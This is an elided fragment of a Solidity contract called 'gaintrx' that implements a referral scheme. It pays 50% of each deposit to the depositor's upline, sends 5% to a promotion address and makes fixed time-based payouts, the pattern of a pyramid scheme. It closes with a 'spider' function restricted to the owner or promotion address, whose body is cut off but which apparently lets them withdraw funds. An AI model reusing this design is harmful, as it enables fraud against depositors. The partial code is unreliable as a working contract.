...
contract gaintrx {
    ...
    address payable public promotion;
    ...
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != promotion && (users[_upline].deposit_time > 0 || _upline == promotion)) {
    ...
    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == promotion , "No upline");
        ...
        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount  * 50/ 100;

            emit DirectPayout(users[_addr].upline, _addr, _amount * 50/ 100);
        }
        ...
        promotion.transfer(_amount * 5 / 100);
    ...
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        ...
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 288 minutes) / 100) - users[_addr].deposit_payouts;
    ...
    function spider( uint _amount) external {
        require(msg.sender==owner || msg.sender==promotion ,'Permission denied');
        if (_amount > 0) {
